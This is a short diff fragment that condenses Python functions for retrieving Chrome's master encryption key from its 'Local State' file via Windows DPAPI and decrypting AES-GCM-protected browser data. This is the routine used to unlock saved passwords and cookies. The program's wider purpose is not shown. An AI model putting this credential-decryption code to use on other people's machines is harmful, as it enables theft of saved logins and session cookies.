@@ -100,18 +100,12 @@ def get_encryption_key():
     local_state_path = os.path.join(os.environ["USERPROFILE"],"AppData", "Local", 
     "Google", "Chrome","User Data", "Local State")
     with open(local_state_path, "r", encoding="utf-8") as f:
-        local_state = f.read()
-        local_state = loads(local_state)
-    key = b64decode(local_state["os_crypt"]["encrypted_key"])
-    key = key[5:]
-    return CryptUnprotectData(key, None, None, None, 0)[1]
+        local_state = loads(f.read())
+    return CryptUnprotectData(b64decode(local_state["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]
 
 def decrypt_data(data, key):
     try:
-        iv = data[3:15]
-        data = data[15:]
-        cipher = AES.new(key, AES.MODE_GCM, iv)
-        return cipher.decrypt(data)[:-16].decode()
+        return AES.new(key, AES.MODE_GCM, data[3:15]).decrypt(data[15:])[:-16].decode()
     except:
         try:
             return str(CryptUnprotectData(data, None, None, None, 0)[1])
